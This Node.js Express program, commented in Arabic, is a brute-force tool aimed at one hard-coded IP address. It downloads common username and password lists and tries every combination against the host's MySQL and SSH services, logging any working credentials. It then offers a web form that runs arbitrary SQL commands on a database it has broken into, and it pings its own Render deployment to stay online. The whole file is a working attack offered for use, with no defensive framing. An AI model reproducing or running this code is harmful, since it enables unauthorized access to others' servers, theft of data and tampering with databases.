const express = require('express');
const mysql = require('mysql2/promise');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const app = express();
const port = process.env.PORT || 10000;

let logs = [];
let connectedService = null;
let connectionResult = null;
let credentials = []; // قائمة user:pass

const targetIP = '185.182.193.132';

// روابط لقوائم اليوزر والباسورد
const usernameListURL = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames.txt';
const passwordListURL = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt';

// Ping لمنع توقف السيرفر على Render
setInterval(() => {
  fetch(`https://noon-9v11.onrender.com/`).catch(() => {});
}, 60_000);

// تحميل القوائم
async function loadCredentials() {
  const users = await fetch(usernameListURL).then(res => res.text());
  const passes = await fetch(passwordListURL).then(res => res.text());
  const usernames = users.split('\n').filter(Boolean);
  const passwords = passes.split('\n').filter(Boolean);
  for (const user of usernames) {
    for (const pass of passwords) {
      credentials.push({ user, pass });
    }
  }
  logs.push(`📥 تم تحميل ${credentials.length} بيانات تسجيل`);
}

// تجربة MySQL
async function tryMySQL() {
  for (const { user, pass } of credentials) {
    try {
      const conn = await mysql.createConnection({
        host: targetIP,
        port: 3306,
        user,
        password: pass,
      });
      const [rows] = await conn.execute('SHOW DATABASES;');
      connectionResult = rows;
      connectedService = 'MySQL';
      logs.push(`✅ MySQL Connected - ${user}:${pass}`);
      return;
    } catch (e) {
      logs.push(`❌ MySQL Failed: ${user}:${pass}`);
    }
  }
}

// تجربة SSH
async function trySSH() {
  return new Promise((resolve) => {
    let index = 0;
    const tryNext = () => {
      if (index >= credentials.length) return resolve();
      const conn = new Client();
      const { user, pass } = credentials[index++];
      conn
        .on('ready', () => {
          connectedService = 'SSH';
          logs.push(`✅ SSH Connected - ${user}:${pass}`);
          connectionResult = '✅ Connected via SSH - يمكنك الآن تنفيذ الأوامر من /cmd';
          conn.end();
          resolve();
        })
        .on('error', () => {
          logs.push(`❌ SSH Failed: ${user}:${pass}`);
          tryNext();
        })
        .connect({
          host: targetIP,
          port: 22,
          username: user,
          password: pass,
          readyTimeout: 5000,
        });
    };
    tryNext();
  });
}

// واجهة المستخدم
app.get('/', (req, res) => {
  res.send(`
    <html style="background:#000;color:#0f0;padding:20px;font-family:monospace">
      <h2>🔍 فحص SSH / MySQL على ${targetIP}</h2>
      <p>⏳ الخدمة المتصلة: ${connectedService || 'لا يوجد اتصال بعد'}</p>
      <p>📦 النتائج:</p>
      <pre>${JSON.stringify(connectionResult, null, 2)}</pre>
      <h3>📜 السجل:</h3>
      <pre>${logs.slice(-20).join('\n')}</pre>
      <form method="GET" action="/cmd">
        <input name="q" placeholder="اكتب أمر SSH أو SQL" style="width:100%;padding:5px">
        <button type="submit">تشغيل</button>
      </form>
    </html>
  `);
});

// تنفيذ أوامر (لـ MySQL فقط حالياً)
app.get('/cmd', async (req, res) => {
  const cmd = req.query.q || '';
  if (!connectedService) return res.send('❌ لم يتم الاتصال بأي خدمة بعد');

  if (connectedService === 'MySQL') {
    const { user, pass } = credentials.find(({ user, pass }) =>
      logs.includes(`✅ MySQL Connected - ${user}:${pass}`)
    );
    try {
      const conn = await mysql.createConnection({
        host: targetIP,
        port: 3306,
        user,
        password: pass,
      });
      const [rows] = await conn.execute(cmd);
      return res.send(`<pre>${JSON.stringify(rows, null, 2)}</pre><a href="/">رجوع</a>`);
    } catch (e) {
      return res.send('❌ خطأ في تنفيذ الأمر');
    }
  }

  res.send('🔒 SSH: تنفيذ الأوامر غير مفعل بعد');
});

// تشغيل السيرفر
app.listen(port, async () => {
  logs.push(`🚀 Running on port ${port}`);
  await loadCredentials();
  await tryMySQL();
  await trySSH();
});
